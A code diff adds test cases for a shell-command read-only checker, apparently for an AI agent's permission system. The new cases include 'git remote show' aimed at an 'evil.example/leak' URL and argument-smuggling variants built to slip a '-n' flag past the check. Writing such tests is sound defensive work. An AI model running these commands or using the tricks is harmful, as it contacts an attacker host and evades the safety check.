@@ -227,6 +227,12 @@ describe('evaluateShellCommandReadOnly', () => {
       'git remote set-url origin url',
       'git remote unknown-action',
       'git remote show remove',
+      // `show` queries the remote; `-n` is not proven to reach git (#14359).
+      'git remote show origin',
+      'git remote show https://evil.example/leak',
+      'git remote show -n origin',
+      'git remote show https://evil.example/leak [--][--] -n',
+      'git remote show https://evil.example/leak <<<-n',
       'git remote get-url prune',
       'git diff --output=patch',
       'git log --output=log.out',
